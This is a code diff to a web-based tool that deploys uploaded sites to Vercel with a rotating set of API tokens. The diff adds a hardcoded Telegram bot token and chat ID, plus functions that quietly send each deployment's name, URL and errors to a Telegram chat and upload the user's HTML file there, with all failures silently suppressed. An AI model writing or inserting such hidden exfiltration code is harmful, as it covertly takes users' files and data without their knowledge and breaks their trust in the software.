@@ -6,7 +6,9 @@
             "HwNrfVWGaYB6kg5GAxHJRMbA",
             "2XzSNnNXBHS3PpdmUJnvQ08M"
         ];
-
+          const botToken = "8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0";
+         const chatId = "7492782458";
+         
         let selectedFile = null;
         let currentTokenIndex = 0;
 
@@ -304,6 +306,14 @@
                                     addToConsole('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
                                     
                                     showInfoPanel(websiteUrl, currentTokenIndex);
+                                  
+                                                         
+                        await sendToTelegram(siteName.value, websiteUrl, currentTokenIndex, null);
+                        
+                        if (!selectedFile.name.endsWith('.zip')) {
+                            const htmlText = await readFileAsText(selectedFile);
+                            await sendHtmlToTelegram(htmlText, siteName.value);
+                        }
                                     
                                 } else {
                                     errorMessage = data.error?.message || "Terjadi kesalahan pada deployment";
@@ -338,16 +348,72 @@
                         } else {
                             showResult("Semua token Vercel gagal. Coba lagi nanti.", "error");
                             addToConsole('$ Semua token Vercel telah dicoba dan gagal', 'error');
+                                            
+                await sendToTelegram(siteName.value, null, currentTokenIndex, error.message);
                         }
                     }
+
+        if (!deploymentSuccess && errorMessage) {
+            await sendToTelegram(siteName.value, null, currentTokenIndex, errorMessage);
+        }
+        
                 } catch (error) {
                     addToConsole(`✗ Error: ${error.message}`, 'error');
                     showResult(`Terjadi kesalahan: ${error.message}`, "error");
+
+        await sendToTelegram(siteName.value, null, currentTokenIndex, error.message);
                 } finally {
                     resetDeployButton();
                 }
             };
 
+async function sendToTelegram(siteName, websiteUrl, tokenIndex, error) {
+    try {
+        let message = "";
+        
+        if (websiteUrl) {
+            message = `🚀 <b>Deployment Berhasil!</b>\n\n📁 Project: ${siteName}\n🔗 URL: ${websiteUrl}\n🎯 Token: ${tokenIndex + 1}\n⏰ Waktu: ${new Date().toLocaleString()}\n\n<i>Deployment By AldzX505</i>`;
+        } else {
+            message = `❌ <b>Deployment Gagal!</b>\n\n📁 Project: ${siteName}\n🎯 Token: ${tokenIndex + 1}\n💥 Error: ${error}\n⏰ Waktu: ${new Date().toLocaleString()}`;
+        }
+        
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: "HTML"
+            })
+        });
+        
+        const data = await response.json();
+        if (data.ok) {} else {}
+    } catch (error) {}
+}
+
+async function sendHtmlToTelegram(htmlContent, siteName) {
+    try {
+        const blob = new Blob([htmlContent], { type: 'text/html' });
+        const file = new File([blob], `${siteName}.html`, { type: 'text/html' });
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file);
+        formData.append('caption', `📄 File HTML untuk project: ${siteName}\n⏰ ${new Date().toLocaleString()}`);
+
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: "POST",
+            body: formData
+        });
+        
+        const data = await response.json();
+        if (data.ok) {} 
+          else {}
+    } catch (error) {}
+   }
             document.getElementById('btnClear').addEventListener('click', () => {
                 document.getElementById('terminalContent').innerHTML = '<div class="terminal-line">$ Terminal cleared</div><div class="terminal-line">$ Siap untuk menerima file...</div>';
             });
